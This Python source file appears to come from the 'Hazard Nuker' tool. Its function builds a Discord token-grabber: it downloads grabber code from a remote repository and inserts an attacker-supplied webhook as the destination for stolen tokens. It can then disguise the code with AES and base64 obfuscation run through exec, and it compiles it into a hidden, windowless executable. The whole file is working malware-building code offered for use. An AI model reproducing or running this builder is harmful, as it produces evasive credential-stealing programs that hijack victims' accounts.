# Hazard was proudly coded by Rdimo (https://github.com/Rdimo).
# Copyright (c) 2021 Rdimo#6969 | https://Cheataway.com
# Hazard Nuker under the GNU General Public Liscense v2 (1991).

import os
import shutil
import Hazard
import requests
import base64
import random
import PyInstaller.__main__

from Crypto.Cipher import AES
from Crypto import Random
from colorama import Fore

from util.plugins.common import setTitle, installPackage

def TokenGrabberV2(WebHook, fileName):
    required = [
        'requests',
        'psutil',
        'pypiwin32',
        'pycryptodome',
        'pyinstaller',
        'pillow',
    ]
    installPackage(required)
    code = requests.get("https://raw.githubusercontent.com/Rdimo/Hazard-Token-Grabber-V2/master/main.py").text.replace("WEBHOOK_HERE", WebHook)
    with open(f"{fileName}.py", 'w', errors="ignore") as f:
        f.write(code)

    print(f"Do you want to obfuscate {fileName}.exe?")
    yesno = input(f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}y/n: {Fore.RED}')
    if yesno.lower() == "y" or yesno.lower() == "yes":
        IV = Random.new().read(AES.block_size)
        key = u''
        for i in range(8):
            key = key + chr(random.randint(0x4E00, 0x9FA5))

        with open(f'{fileName}.py') as f: 
            _file = f.read()
            imports = ''
            input_file = _file.splitlines()
            for i in input_file:
                if i.startswith("import") or i.startswith("from"):
                    imports += i+';'

        with open(f'{fileName}.py', "wb") as f:
            encodedBytes = base64.b64encode(_file.encode())
            obfuscatedBytes = AES.new(key.encode(), AES.MODE_CFB, IV).encrypt(encodedBytes)
            f.write(f'{imports}exec(__import__(\'\\x62\\x61\\x73\\x65\\x36\\x34\').b64decode(AES.new({key.encode()}, AES.MODE_CFB, {IV}).decrypt({obfuscatedBytes})).decode())'.encode())

    print(f"{Fore.RED}\nCreating {fileName}.exe\n{Fore.RESET}")
    setTitle(f"Creating {fileName}.exe")
    #the equivalent to "pyinstaller {fileName}.py -n {fileName} --onefile --noconsole --log-level=INFO -i NONE"
    # PyInstaller.__main__.run([
    #     '%s.py' % fileName,
    #     '--name=%s' % fileName,
    #     '--onefile',
    #     '--clean',
    #     '--noconsole',
    #     '--log-level=INFO',
    #     '--icon=NONE',
    # ])
    os.system(f"python -m PyInstaller --onefile --noconsole --clean --log-level=INFO -i NONE -n {fileName} {fileName}.py")
    try:
        #clean build files
        shutil.move(f"{os.getcwd()}\\dist\\{fileName}.exe", f"{os.getcwd()}\\{fileName}.exe")
        shutil.rmtree('build')
        shutil.rmtree('dist')
        shutil.rmtree('__pycache__')
        os.remove(f'{fileName}.spec')
        os.remove(f'{fileName}.py')
    except FileNotFoundError:
        pass

    print(f"\n{Fore.GREEN}File created as {fileName}.exe\n")
    input(f'{Fore.GREEN}[{Fore.YELLOW}>>>{Fore.GREEN}] {Fore.RESET}Enter anything to continue . . .  {Fore.RED}')
    Hazard.main()
